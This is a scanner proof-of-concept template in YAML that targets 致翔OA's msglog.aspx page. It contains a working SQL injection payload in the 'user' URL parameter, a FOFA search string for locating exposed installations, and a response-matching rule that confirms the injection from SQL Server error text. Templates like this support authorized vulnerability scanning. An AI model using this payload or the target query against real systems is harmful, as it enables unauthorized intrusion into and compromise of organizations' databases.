id: poc-yaml-zxoa-msglog-aspx-sqli
info:
  name: 致翔OA msglog.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 致翔OA
  fofa: app="致翔软件-致翔OA" && is_domain=false
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /mainpage/msglog.aspx?user=1%27+and+(SELECT+sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,+%27{{.t1}}%27)))%3d1+--
  expression: "status_code == 500 && \ncontains(body,\"nvarchar\") &&\ncontains(body,\"\
    SqlException\") &&\ncontains(body,t2)\n"
transport: http
